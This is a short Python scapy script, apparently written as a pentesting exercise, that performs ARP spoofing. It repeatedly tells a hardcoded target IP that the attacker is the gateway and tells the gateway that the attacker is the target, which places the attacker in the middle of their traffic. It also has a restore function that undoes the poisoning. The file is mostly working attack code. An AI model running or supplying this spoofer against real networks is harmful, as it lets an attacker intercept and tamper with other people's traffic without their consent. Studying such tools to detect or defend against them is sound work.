#/usr/bin/env python
import time
import sys
from scapy.layers.l2 import ARP
from scapy.all import send
from utils.scapy_utils import spoof, get_mac, check_port_forwarding

check_port_forwarding()

def restore(destination_ip, source_ip, get_mac_address): # Gonna call this with import get_mac
    target_mac = get_mac_address(destination_ip) # Using get_mac from above here
    source_mac = get_mac_address(source_ip)
    # Creating an ARP Response (op to 2), with the following fields (arguments)
    # pdst: IP Destination.
    # hwdst: HW (MAC Address) Destination.
    # psrc: IP Source.
    # hwsrc: MAC Address Source.  Essential otherwise Kali will still set the source MAC as my MAC.
    packet = ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)
# Destination IP is the IP for the Client (target). Source IP = Router (gateway)
# restore("192.168.63.174", "192.168.63.2", get_mac)

sent_packets_count = 0
try:
    while True:
        # Tell the Target Device I am the Router.
        spoof("192.168.63.174","192.168.63.2", get_mac)
        # Tell the Router I am the Target Device.
        spoof("192.168.63.2","192.168.63.174", get_mac)
        sent_packets_count += 2
        # Use ,end="" for python 3
        print("\r[+] Packet Count: " + str(sent_packets_count)),
        sys.stdout.flush()
        # Add a delay.
        time.sleep(2) # Can quit by pressing Ctrl+c
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ...... Quitting.")
